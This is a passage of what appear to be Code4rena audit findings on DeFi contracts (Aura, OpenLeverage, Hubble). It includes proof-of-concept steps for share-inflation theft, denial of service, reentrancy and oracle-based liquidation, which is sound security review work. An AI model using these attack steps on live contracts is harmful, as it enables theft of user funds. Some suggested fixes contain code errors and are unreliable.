        user.amount = user.amount.sub(_amount);
        user.rewardDebt = user.amount.mul(pool.accCvxPerShare).div(1e12);
        pool.lpToken.safeTransfer(address(msg.sender), _amount);
```

### Recommended Mitigation Steps

Consider adding a direct reentrancy control, e.g. nonReentrant modifier:

<https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard>

Also, consider finishing all internal state updates prior to external calls:

<https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/#pitfalls-in-reentrancy-solutions>


 > [code4rena aurafinance/aura-contracts#84](https://github.com/aurafinance/aura-contracts/pull/84)



***"
123.md,`AuraBalRewardPool` charges a penalty to all users in the pool if the `AuraLocker` has been shut down,medium,"Users are charged the penalty due to admin actions, and they have no way to avoid it

### Proof of Concept

When claiming their rewards, users are charged a penalty if they take the reward directly, rather than by passing it into the `auraLocker`. Those are the only two options:

```solidity
File: contracts/AuraBalRewardPool.sol   #1

176       function getReward(bool _lock) public updateReward(msg.sender) returns (bool) {
177           uint256 reward = rewards[msg.sender];
178           if (reward > 0) {
179               rewards[msg.sender] = 0;
180               if (_lock) {
181                   auraLocker.lock(msg.sender, reward);
182               } else {
183                   uint256 penalty = (reward * 2) / 10;
184                   pendingPenalty += penalty;
185                   rewardToken.safeTransfer(msg.sender, reward - penalty);
186               }
```

[AuraBalRewardPool.sol#L176-L186](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraBalRewardPool.sol#L176-L186)<br>

If the pool has been shut down, the `auraLocker.lock()` call will always revert, which means the user must take the penalty path:

```solidity
File: contracts/AuraLocker.sol   #2

258       function _lock(address _account, uint256 _amount) internal {
259           require(_amount > 0, ""Cannot stake 0"");
260           require(!isShutdown, ""shutdown"");
```

[AuraLocker.sol#L258-L260](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/contracts/AuraLocker.sol#L258-L260)<br>

### Recommended Mitigation Steps

Don't charge the penalty if the locker has been shut down.




***"
123.md,`CrvDepositor.sol` Wrong implementation of the 2-week buffer for lock,medium,"[CrvDepositor.sol#L127-L134](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L127-L134)<br>

```solidity
uint256 unlockAt = block.timestamp + MAXTIME;
uint256 unlockInWeeks = (unlockAt/WEEK)*WEEK;

//increase time too if over 2 week buffer
if(unlockInWeeks.sub(unlockTime) > 2){
    IStaker(staker).increaseTime(unlockAt);
    unlockTime = unlockInWeeks;
}
```

In `_lockCurve()`, `unlockInWeeks - unlockTime` is being used as a number in weeks, while it actually is a number in seconds.

Thus, comparing it with `2` actually means a 2 seconds buffer instead of a 2 weeks buffer.

The intention is to wait for 2 weeks before extending the lock time again, but the current implementation allows the extension of the lock once a new week begins.

### Recommended Mitigation Steps

Consider changing the name of `unlockTime` to `unlockTimeInWeeks`, and:

1.  Change L94-102 to:

[CrvDepositor.sol#L94-L102](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/CrvDepositor.sol#L94-L102)<br>

```solidity
uint256 unlockAt = block.timestamp + MAXTIME;
uint256 unlockInWeeks = unlockAt / WEEK;

//release old lock if exists
IStaker(staker).release();
//create new lock
uint256 crvBalanceStaker = IERC20(crvBpt).balanceOf(staker);
IStaker(staker).createLock(crvBalanceStaker, unlockAt);
unlockTimeInWeeks = unlockInWeeks;
```

2.  Change L127-L134 to:

```solidity
uint256 unlockAt = block.timestamp + MAXTIME;
uint256 unlockInWeeks = unlockAt / WEEK;

//increase time too if over 2 week buffer
if(unlockInWeeks.sub(unlockTime) > 2){
    IStaker(staker).increaseTime(unlockAt);
    unlockTimeInWeeks = unlockInWeeks;
}
```




***"
123.md,`massUpdatePools()` is susceptible to DoS with block gas limit,medium,"[ConvexMasterChef.sol#L178-L183](https://github.com/code-423n4/2022-05-aura/blob/main/convex-platform/contracts/contracts/ConvexMasterChef.sol#L178-L183)<br>

massUpdatePools() is a public function and it calls the updatePool() function for the length of poolInfo. Hence, it is an unbounded loop, depending on the length of poolInfo.<br>
If poolInfo.length is big enough, block gas limit may be hit.

### Proof of Concept

<https://consensys.github.io/smart-contract-best-practices/attacks/denial-of-service/#dos-with-block-gas-limit>

### Recommended Mitigation Steps

I suggest to limit the max number of loop iterations to prevent hitting block gas limit.










***"
123.md,"`ConvexMasterChef`: When using `add()` and `set()`, it should always call `massUpdatePools()` to update all pools",medium,"Same as IDX-003 in <https://public-stg.inspex.co/report/Inspex_AUDIT2021024_LuckyLion_Farm_FullReport_v2.0.pdf><br>
The totalAllocPoint variable is used to determine the portion that each pool would get from the total reward, so it is one of the main factors used in the rewards calculation. Therefore, whenever the totalAllocPoint variable is modified without updating the pending reward first, the reward of each pool will be incorrectly calculated.<br>
For example, when  \_withUpdate is false, in the add() shown below, the totalAllocPoint variable will be modified without updating the rewards (massUpdatePools()).

        function add(
            uint256 _allocPoint,
            IERC20 _lpToken,
            IRewarder _rewarder,
            bool _withUpdate
        ) public onlyOwner {
            if (_withUpdate) {
                massUpdatePools();
            }
            uint256 lastRewardBlock = block.number > startBlock
                ? block.number
                : startBlock;
            totalAllocPoint = totalAllocPoint.add(_allocPoint);
            poolInfo.push(
                PoolInfo({
                    lpToken: _lpToken,
                    allocPoint: _allocPoint,
                    lastRewardBlock: lastRewardBlock,
                    accCvxPerShare: 0,
                    rewarder: _rewarder
                })
            );
        }

### Proof of Concept

[ConvexMasterChef.sol#L96-L138](https://github.com/code-423n4/2022-05-aura/blob/4989a2077546a5394e3650bf3c224669a0f7e690/convex-platform/contracts/contracts/ConvexMasterChef.sol#L96-L138)<br>

### Recommended Mitigation Steps

Removing the \_withUpdate variable in the add() and set() functions and always calling the massUpdatePools() function before updating totalAllocPoint variable.


 > [All code4rena fixes code-423n4/2022-05-aura#6](https://github.com/code-423n4/2022-05-aura/pull/6)



***"
123.md,Duplicate LP token could lead to incorrect reward distribution,medium,"[ConvexMasterChef.sol#L96](https://github.com/code-423n4/2022-05-aura/blob/main/convex-platform/contracts/contracts/ConvexMasterChef.sol#L96)<br>

It was observed that add function is not checking for duplicate lpToken which allows 2 or more pools to have exact same lpToken. This can cause issue with reward distribution

In case of duplicate lpToken, lpSupply will become incorrect (ConvexMasterChef.sol#L160), hence rewards will be calculated incorrectly

### Proof of Concept

1.  Owner call add function and uses lpToken as A
2.  Owner again call add function and mistakenly provides lpToken as A
3.  Now 2 pools will be created with lpToken as A
4.  This becomes a problem while reward calculation or updatePool function which uses pool.lpToken.balanceOf(address(this)). Since both pool have same lpToken so lpSupply will be calculated as same which is wrong. Since lpSupply defines the rewardRate so this directly impact reward calculation

### Recommended Mitigation Steps

Add a global variable keeping track of all lpToken added for pool. In case of duplicate lpToken add function should fail.





***"
72.md,"OpenLevV1Lib's and LPool's `doTransferOut` functions call native `payable.transfer`, which can be unusable for smart contract calls",high,"When OpenLev operations use a wrapped native token, the whole user withdraw is being handled with a `payable.transfer()` call.

This is unsafe as `transfer` has hard coded gas budget and can fail when the user is a smart contract. This way any programmatical usage of OpenLevV1 and LPool is at risk.

Whenever the user either fails to implement the payable fallback function or cumulative gas cost of the function sequence invoked on a native token transfer exceeds 2300 gas consumption limit the native tokens sent end up undelivered and the corresponding user funds return functionality will fail each time.

As OpenLevV1 `closeTrade` is affected this includes user's principal funds freeze scenario, so marking the issue as a high severity one.

#### Proof of Concept

OpenLevV1Lib and LPool have `doTransferOut` function that calls native token payable.transfer:

OpenLevV1Lib.doTransferOut

<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1Lib.sol#L253>

LPool.doTransferOut

<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L297>

LPool.doTransferOut is used in LPool redeem and borrow, while OpenLevV1Lib.doTransferOut is used in OpenLevV1 trade manipulation logic:

closeTrade

<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L204>

<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L215>

liquidate

<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L263>

<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L295>

<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L304>

#### References

The issues with `transfer()` are outlined here:

<https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/>

#### Recommended Mitigation Steps

OpenLevV1's `closeTrade` and `liquidate` as well as LPool's `redeem`, `redeemUnderlying`, `borrowBehalf`, `repayBorrowBehalf`, `repayBorrowEndByOpenLev` are all `nonReentrant`, so reentrancy isn't an issue and `transfer()` can be just replaced.

Using low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised:

<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60>






***"
72.md,`UniV2ClassDex.sol#uniClassSell()` Tokens with fee on transfer are not fully supported,medium,"<https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L31-L56>

```solidity
function uniClassSell(DexInfo memory dexInfo,
    address buyToken,
    address sellToken,
    uint sellAmount,
    uint minBuyAmount,
    address payer,
    address payee
) internal returns (uint buyAmount){
    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);
    IUniswapV2Pair(pair).sync();
    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();
    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);
    uint balanceBefore = IERC20(buyToken).balanceOf(payee);
    dexInfo.fees = getPairFees(dexInfo, pair);
    if (buyToken < sellToken) {
        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);
        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, """");
    } else {
        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);
        IUniswapV2Pair(pair).swap(0, buyAmount, payee, """");
    }

    require(buyAmount >= minBuyAmount, 'buy amount less than min');
    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);
    return bought;
}
```

While `uniClassBuy()` correctly checks the actually received amount by comparing the before and after the balance of the receiver, `uniClassSell()` trusted the result given by `getAmountOut()`. This makes `uniClassSell()` can result in an output amount fewer than `minBuyAmount`.

<https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L101-L102>

#### Recommendation

Change to:

```solidity
function uniClassSell(DexInfo memory dexInfo,
    address buyToken,
    address sellToken,
    uint sellAmount,
    uint minBuyAmount,
    address payer,
    address payee
) internal returns (uint bought){
    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);
    IUniswapV2Pair(pair).sync();
    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();
    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);
    uint balanceBefore = IERC20(buyToken).balanceOf(payee);
    dexInfo.fees = getPairFees(dexInfo, pair);
    if (buyToken < sellToken) {
        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);
        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, """");
    } else {
        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);
        IUniswapV2Pair(pair).swap(0, buyAmount, payee, """");
    }
    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);
    require(bought >= minBuyAmount, 'buy amount less than min');
}
```



 >
 > It's fair to say that this will lead to value leakage, so I think `medium` severity is justified.



***"
72.md,Missing payable,medium,"The following functions are not payable but uses msg.value - therefore the function must be payable.
This can lead to undesired behavior.

        LPool.sol, addReserves should be payable since using msg.value






***"
72.md,Eth sent to Timelock will be locked in current implementation,medium,"Eth sent to Timelock will be locked in current implementation. I came across this problem while playing around with the governance contract.

#### Proof of Concept

*   Setup the governance contracts (GovernanceAlpha, Timelock)
*   Send eth to timelock contract
*   Setup a proposal to send 0.1 eth out. Code snippet in ether.js below. proxy refers to GovernorAlpha.

```js
await proxy.propose(
    [signers[3].address],
    [ethers.utils.parseEther(""0.1"")],
    [""""],
    [ethers.BigNumber.from(0)],
    ""Send funds to 3rd signer""
);
```
*   Vote and have the proposal succeed.
*   Execute the proposal, the proposal number here is arbitrary.

```js
await proxy.execute(2);  // this fails
    await proxy.execute(2, {value: ethers.utils.parseEther(""0.1"")})  // this would work
    0.1 eth will be sent out, but it is sent from the msg.sender not from the timelock contract.
```

#### Recommended Mitigation Steps

Consider implementing the following code.
```solidity

function execute(uint proposalId) external {
    require(state(proposalId) == ProposalState.Queued, ""GovernorAlpha::execute: proposal can only be executed if it is queued"");
    Proposal storage proposal = proposals[proposalId];
    proposal.executed = true;
    for (uint i = 0; i < proposal.targets.length; i++) {
        timelock.executeTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);
    }
    emit ProposalExecuted(proposalId);
}
```

#### Reference

<https://github.com/compound-finance/compound-protocol/pull/177/files>






***"
72.md,OpenLevV1.closeTrade with V3 DEX doesn't correctly accounts fee on transfer tokens for repayments,medium,"The amount that OpenLevV1 will receive can be less than V3 DEX indicated as a swap result, while it is used as given for position debt repayment accounting.

This way actual funds received can be less than accounted, leaving to system funds deficit, which can be exploited by a malicious user, draining contract funds with multiple open/close with a taxed token.

In the `trade.depositToken != longToken` case when `flashSell` is used this can imply inability to send remainder funds to a user and the failure of the whole closeTrade function, the end result is a freezing of user's funds within the system.

#### Proof of Concept

`trade.depositToken != longToken` case, can be wrong repayment accounting, which will lead to a deficit if the received funds are less than DEX returned `closeTradeVars.receiveAmount`.

As a side effect, `doTransferOut` is done without balance check, so the whole position close can revert, leading to inability to close the position and freeze of user's funds this way:

<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L197-204>

I.e. if there is enough funds in the system they will be drained, if there is not enough funds, user's position close will fail.

V3 sell function doesn't check for balance change, using DEX returned amount as is:

<https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/dex/eth/UniV3Dex.sol#L61-70>

#### Recommended Mitigation Steps

If fee on tranfer tokens are fully in scope, do control all the accounting and amounts to be returned to a user via balance before/after calculations for DEX V3 logic as well.






***"
72.md,anti-flashloan mechanism may lead to protocol default,medium,"There is a price check to avoid flash loan attacks which significantly moved the price. If current price is 5% lower than the stored twap price, the liquidation will fail. This design can be dangerous as it is to openleverage's benefit to close under-collateralized position ASAP when there is a huge market drawdown. When the market keep trading downward, it is possible that the spot price keep trading 5% lower than the twap, which prevent any liquidation from happening and causing the protocol to be under-collateralized.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/OpenLevV1Lib.sol#L191>

```solidity
// Avoid flash loan
if (prices.price < prices.cAvgPrice) {
    uint differencePriceRatio = prices.cAvgPrice.mul(100).div(prices.price);
    require(differencePriceRatio - 100 < maxLiquidationPriceDiffientRatio, 'MPT');
}
``` 

#### Recommended Mitigation Steps

Instead of revert with `maxLiquidationPriceDiffientRatio`, use the twap price to determine if the position is healthy.







 >
 > I agree with the sponsor here. The issue outlined by the warden seems to be safeguarded by the two other checks in `isPositionHealthy()`


 >
 > This was an awesome find!



***"
89.md,Update initializer modifier to prevent reentrancy during initialization,high,"<https://github.com/code-423n4/2022-02-hubble/blob/main/package.json#L17><br>
<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/legos/Governable.sol#L5><br>
<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/legos/Governable.sol#L24>

While Governable.sol is out of scope, I figured this issue would still be fair game.

The solution uses: `""@openzeppelin/contracts"": ""4.2.0""`.<br>
This dependency has a known high severity vulnerability: <https://security.snyk.io/vuln/SNYK-JS-OPENZEPPELINCONTRACTS-2320176><br>
Which makes this contract vulnerable:

    File: Governable.sol
    05: import { Initializable } from ""@openzeppelin/contracts/proxy/utils/Initializable.sol"";
    ...
    24: contract Governable is VanillaGovernable, Initializable {}

This contract is inherited at multiple places:

    contracts/AMM.sol:
      11: contract AMM is IAMM, Governable {

    contracts/InsuranceFund.sol:
      13: contract InsuranceFund is VanillaGovernable, ERC20Upgradeable {

    contracts/Oracle.sol:
      11: contract Oracle is Governable {

    contracts/legos/HubbleBase.sol:
      15: contract HubbleBase is Governable, Pausable, ERC2771Context {

    contracts/ClearingHouse.sol:
      11: contract ClearingHouse is IClearingHouse, HubbleBase {

    contracts/MarginAccount.sol:
      25: contract MarginAccount is IMarginAccount, HubbleBase {

ìnitializer()\` is used here:

```
contracts/AMM.sol:
  99:     ) external initializer {

contracts/ClearingHouse.sol:
  44:     ) external initializer {

contracts/MarginAccount.sol:
  124:     ) external initializer {

contracts/Oracle.sol:
  20:     function initialize(address _governance) external initializer {

```

### Recommended Mitigation Steps

Upgrade `@openzeppelin/contracts` to version 4.4.1 or higher.






***"
89.md,denial of service,high,"<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L53><br>

processWithdrawals can process limited amount in each call.<br>
An attacker can push to withdrawals enormous amount of withdrawals with amount = 0.<br>
In order to stop the dos attack and process the withdrawal, the governance needs to spend as much gas as the attacker.<br>
If the governance doesn't have enough money to pay for the gas, the withdrawals can't be processed.

### Proof of Concept

Alice wants to attack vusd, she spends 1 millions dollars for gas to push as many withdrawals of amount = 0 as she can.<br>
If the governance wants to process the deposits after Alices empty deposits, they also need to spend at least 1 million dollars for gas in order to process Alice's withdrawals first.<br>
But the governance doesn't have 1 million dollars so the funds will be locked.

### Recommended Mitigation Steps

Set a minimum amount of withdrawal. e.g. 1 dollar

        function withdraw(uint amount) external {
            require(amount >= 10 ** 6);
            burn(amount);
            withdrawals.push(Withdrawal(msg.sender, amount));
        }








***"
89.md,InsuranceFund depositors can be priced out & deposits can be stolen,high,"<https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/InsuranceFund.sol#L44-L54><br>

The `InsuranceFund.deposit` function mints initial `shares` equal to the deposited amount.<br>
The deposit / withdraw functions also use the VUSD contract balance for the shares computation. (`balance() = vusd.balanceOf(address(this))`)

It's possible to increase the share price to very high amounts and price out smaller depositors.

### Proof of Concept

*   `deposit(_amount = 1)`: Deposit the smallest unit of VUSD as the first depositor. Mint 1 share and set the total supply and VUSD balance to `1`.
*   Perform a direct transfer of `1000.0` VUSD to the `InsuranceFund`. The `balance()` is now `1000e6 + 1`
*   Doing any deposits of less than `1000.0` VUSD will mint zero shares: `shares = _amount * _totalSupply / _pool = 1000e6 * 1 / (1000e6 + 1) = 0`.
*   The attacker can call `withdraw(1)` to burn their single share and receive the entire pool balance, making a profit. (`balance() * _shares / totalSupply() = balance()`)

I give this a high severity as the same concept can be used to always steal the initial insurance fund deposit by frontrunning it and doing the above-mentioned steps, just sending the frontrunned deposit amount to the contract instead of the fixed `1000.0`.
They can then even repeat the steps to always frontrun and steal any deposits.

### Recommended Mitigation Steps

The way [UniswapV2 prevents this](https://github.com/Uniswap/v2-core/blob/4dd59067c76dea4a0e8e4bfdda41877a6b16dedc/contracts/UniswapV2Pair.sol#L121) is by requiring a minimum deposit amount and sending `1000` initial shares to the zero address to make this attack more expensive.
The same mitigation can be done here.





***"
89.md,Liquidations can be run on the bogus Oracle prices,medium,"If the price feed is manipulated in any way or there is any malfunction based volatility on the market, a malicious user can use this to liquidate a healthy position.

An attacker can setup a monitoring of the used Oracle feed and act on observing a price outbreak (for example, zero price, which is usually a subject to filtration), liquidating the trader position which is perfectly healthy otherwise, obtaining the collateral with a substantial discount at the expense of the trader.

The same is for a flash crash kind of scenario, i.e. a price outbreak of any nature will allow for non-market liquidation by an attacker, who has the incentives to setup such a monitoring and act on such an outbreak, knowing that it will not be smoothed or filtered out, allowing a liquidation at a non-market price that happen to be printed in the Oracle feed

### Proof of Concept

Oracle.getUnderlyingPrice just passes on the latest Oracle answer, not checking it anyhow:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/Oracle.sol#L24-L35>

It is then used in liquidation triggers providing isLiquidatable and \_getLiquidationInfo functions:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/MarginAccount.sol#L249>

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/MarginAccount.sol#L465>

### Recommended Mitigation Steps

Add a non-zero Oracle price check, possibly add an additional Oracle feed information usage to control that the price is fresh. Please consult the Chainlink for that as OCR introduction might have changed the state of the art approach (i.e. whether and how to use latestRoundData returned data):

<https://docs.chain.link/docs/off-chain-reporting/>

Regarding any price spikes it is straightforward to construct a mitigation mechanics for such cases, so the system will be affected by sustainable price movements only.

As price outrages provide a substantial attack surface for the project it's worth adding some complexity to the implementation.

One of the approaches is to track both current and TWAP prices, and condition all state changing actions, including liquidations, on the current price being within a threshold of the TWAP one. If the liquidation margin level is conservative enough and TWAP window is small enough this is safe for the overall stability of the system, while providing substantial mitigation mechanics by allowing state changes on the locally calm market only.

Another approach is to introduce time delay between liquidation request and actual liquidation. Again, conservative enough margin level plus small enough delay keeps the system safe, while requiring that market conditions allow for liquidation both at request time and at execution time provides ample filtration against price feed outbreaks







***"
89.md,Hidden governance,medium,"The contract use two governance model, one looks hidden.

### Proof of Concept

The [VUSD contract](https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/VUSD.sol#L11) uses `VanillaGovernable` but inherits from `ERC20PresetMinterPauserUpgradeable` and this contract uses roles to use some administrative methods like `pause` or `mint`.

This two-governance model does not seem necessary and can hide or raise suspicion about a rogue pool, thus damaging the user's trust.

### Recommended Mitigation Steps

Unify governance in only one, VanillaGovernable or role based.






***"
89.md,ClearingHouse May Whitelist Duplicate AMMs,medium,"<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L339-L342><br>
<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L269-L282>

`ClearingHouse.sol` allows the Governance protocol to whitelist `AMM.sol` contracts. These contracts allow users to earn profits based on the price of a base asset against a quote asset.

It is possible to add the same `AMM` twice in the function `whitelistAmm()`. The impact is that unrealized profits will be counted multiple times. As a result the liquidation calculations will be incorrect, potentially allowing users to trade while insolvent or incorrectly liquidating solvent users.

Note `whitelistAmm()` may only be called by Governance.

### Proof of Concept

The function `getTotalNotionalPositionAndUnrealizedPnl()` will iterate over all `amms` summing the `unrealizedPnl`  and `notinoalPosition`, thus if an `amm` is repeated the `unrealizedPnl` and `notionalPosition` of that asset will be counted multiple times.

This is used in `_calcMarginFraction()` which calculates a users margin as a fraction of the total position. The margin fraction is used to determine if a user is liquitable or is allowed to open new positions.

### Recommended Mitigation Steps

Consider ensuring the `AMM` does not already exist in the list when adding a new `AMM`.

        function whitelistAmm(address _amm) external onlyGovernance {
            for (uint256 i; i < amm.length; i++) {
                require(amm[i] != IAMM(_amm), ""AMM already whitelisted"");
            }
            emit MarketAdded(amms.length, _amm);
            amms.push(IAMM(_amm));
        }







***"
89.md,`settleFunding` will exceed block gas with more markets and activity,medium,"<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L129><br>
<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L678>

As the number of supported markets grow, `settleFunding` will reach a point were it exceeds the block gas limit on Avalanche C-Chain. This will prevent users from calling the function and cause a wide spread Denial of Service.

Looking at transactions for the current testnet deployment, `settleFunding` already reaches almost 10% of the block gas limit. This is due settle funding iteratively looping through each market, with each iteration entering an unbounded `while` loop in `_calcTwap`. The more active the markets are, the more gas intensive `_calcTwap` becomes, as more snapshots need to be traversed.

The combination of more active markets and an increase in available markets make it very likely that some users will be unable to call `settleFunding` in the long run.

### Proof of Concept

Example of transactions on testnet:

| Gas    | Limit% | Link                                                                                                 |
| ------ | ------ | ---------------------------------------------------------------------------------------------------- |
| 658428 | 8.2%   | <https://testnet.snowtrace.io/tx/0x8123a5658a98e694e7428e66c9e5f9d5cbff8af93d543ed51a80cb367bcccd2c> |
| 653810 | 8.1%   | <https://testnet.snowtrace.io/tx/0xf126eb05245580a73981228d6f0f8d607ad038ca0b68593f0c903e210c1c2c57> |

### Recommended Mitigation Steps

Users should be allowed to settle funding per market or using an array of markets opposed to all markets at once.

```solidity
function settleFundingForMarkets(IAMM[] markets) override external whenNotPaused {
     for (uint i = 0; i < markets.length; i++) {
          markets[i].settleFunding();
     }
}
```

In this way the gas cost will not increase with the number of markets created over time.






***"
89.md,`Oracle.getUnderlyingPrice` could have wrong decimals,medium,"<https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/Oracle.sol#L34><br>

The `Oracle.getUnderlyingPrice` function divides the chainlink price by `100`.<br>
It probably assumes that the answer for the underlying is in 8 decimals but then wants to reduce it for 6 decimals to match USDC.

However, arbitrary `underlying` tokens are used and the chainlink oracles can have different decimals.

### Recommended Mitigation Steps

While most USD price feeds use 8 decimals, it's better to take the on-chain reported decimals into account by doing `AggregatorV3Interface(chainLinkAggregatorMap[underlying]).decimals()`, see [Chainlink docs](https://docs.chain.link/docs/get-the-latest-price/#getting-a-different-price-denomination).<br>
The price should then be scaled down to 6 decimals.





***"
89.md,"After debt seizure from `InsuranceFund`, user can dilute all past participants.",medium,"<https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/InsuranceFund.sol#L56><br>

A user can get a much larger portion of the pool as it recovers from a debt seizure. The intent of the insurance pool seems to be that it could recover from a bad debt event.

### Proof of Concept

1.  Alice is the first LP to the insurance pool, and deposits 1e18 shares.
2.  `seizeBadDebt` is called with 2e18. Now, there are `pendingObligations = 1e18`, and there is 0 vusd in the insurance fund.
3.  Bob (the attacker) directly transfers 1e18 + 1 vUSD.
4.  Bob calls deposit with 1e18 vUSD. All pending obligations will be settled, but there will only be 1 vUSD left in the pool before Bob's deposit. Bob receives `shares = 1e18 * 1e18 / 1`. As a result, Bob will get `1e36` shares, diluting Alice's share of the pool. Bob will be able to take a much larger share of all future profits from the insurance fund until more bad debt is seized. Bob only provided 2e18 + 1 liqudiity, but received an exponentially larger number of shares than Alice.

### Recommended Mitigation Steps

It depends on how you want this to work. You could keep track of the total amount ever contributed by users, and use that for calculations. Or just make staking 1 vUSD = 1 share if the pool total is below the total number of shares.






***"
89.md,ClearingHouse margin calculations will break up if an AMM returning non-6 decimals positions be white listed,medium,"<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L332><br>

It is assumed that VAMM returned positions have exactly `6` decimals for all AMMs white listed in ClearingHouse.

In the same time an array of different AMMs/VAMMs is supported, and there are no guarantees/checks of the precision of the position values they return.

If an VAMM that have different precision is whitelisted, for example having 18 decimals for position figures, then margin requirements checks become invalid.

This will lead to various malfunctions, say perfectly valid positions will be liquidated by any attacker noticing that the calculations are skewed.

### Proof of Concept

ClearingHouse's \_calcMarginFraction is the function that is used for margin requirements checks:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L163-L167>

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L188-L189>

\_calcMarginFraction calls getNotionalPositionAndMargin:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L319-L320>

getNotionalPositionAndMargin calls getTotalNotionalPositionAndUnrealizedPnl:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L291>

getTotalNotionalPositionAndUnrealizedPnl sums up AMM's getNotionalPositionAndUnrealizedPnl results:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L269-L282>

AMM's getNotionalPositionAndUnrealizedPnl returns vamm.get_notional result:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L395-L410>

The above calls are linear decimals wise (i.e. do subtractions/additions kind of operations, preserving the decimals).

Then, \_getMarginFraction mixes up these notionalPosition and margin, obtained from AMM without rescaling, as if they are PRECISION scaled:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L332>

PRECISION is hard coded to be `1e6`:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L15>

For other VAMM operations base precision is set to `1e18`:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L17>

For example, VAMM returned supply is assumed to have 18 decimals:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L523>

Comment says that exchangeExactOut returned quantity will have 6 decimals precision:

<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L495>

As the system imply that VAMMs can vary it is neither guaranteed, nor checked in any way (briefly checked dydx api code, it looks like there are no explicit guarantees either).

If any of VAMM referenced via white listed AMMs return VAMM.get_notional with decimals different from `6`, the \_calcMarginFraction result will become grossly incorrect.

### Recommended Mitigation Steps

If AMM contract is desired to deal with various VAMMs, consider removing decimals related hard coding, adding decimals variables and scaling VAMM returned results accordingly, so that position and margin values' decimals of 6, implied by ClearingHouse logic, be ensured.





***"
